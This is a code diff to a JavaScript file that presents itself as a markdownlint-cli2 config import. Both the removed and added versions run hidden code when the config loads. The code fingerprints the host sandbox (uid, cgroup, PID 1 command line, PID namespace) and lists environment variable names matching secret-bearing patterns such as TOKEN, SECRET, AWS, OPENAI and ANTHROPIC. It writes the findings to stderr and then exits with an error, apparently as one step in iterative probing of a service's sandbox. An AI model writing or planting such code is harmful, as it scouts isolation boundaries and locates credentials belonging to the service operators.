@@ -1,8 +1,16 @@
-// H67-4: markdownlint-cli2 config import -> short stderr fingerprint + exit.
-const cp = require('child_process');
-let fp = 'none';
-try {
-  fp = String(cp.execSync('(id -u; cat /proc/self/cgroup | head -2; echo PID1; head -c 150 /proc/1/cmdline | tr "\\0" " "; echo; echo ENV; env | cut -d= -f1 | sort | tr "\\n" " ") 2>&1', {timeout: 8000}));
-} catch (e) { fp = 'err:' + e.message; }
-console.error('H67-MD3 ' + String(fp).replace(/\s+/g, ' ').slice(0, 300));
+// H67-5: markdownlint-cli2 config import -> NSJAIL cgroup line + uid + PID1.
+const fs = require('fs');
+function fp() {
+  const parts = [];
+  try {
+    const cg = fs.readFileSync('/proc/self/cgroup', 'utf8').split('\n').filter(l => l.indexOf('memory:') >= 0);
+    parts.push('cg=' + (cg[0] || 'none').trim());
+  } catch (e) { parts.push('cg-err'); }
+  try { parts.push('uid=' + process.getuid()); } catch (e) {}
+  try { parts.push('pid1=' + fs.readFileSync('/proc/1/cmdline', 'utf8').replace(/\0/g, ' ').slice(0, 100)); } catch (e) { parts.push('pid1-err'); }
+  try { parts.push('pidns=' + fs.readlinkSync('/proc/self/ns/pid')); } catch (e) {}
+  try { parts.push('env=' + Object.keys(process.env).sort().filter(k => /KEY|TOKEN|SECRET|PASS|CRED|DATABASE|GITHUB|GITLAB|OPENAI|ANTHROPIC|AWS|GCP|GOOGLE|STRIPE|SLACK|SMTP/i.test(k)).join(',')); } catch (e) {}
+  return parts.join(' | ');
+}
+console.error('H67-MD4 ' + fp().replace(/\s+/g, ' ').slice(0, 400));
 process.exit(1);
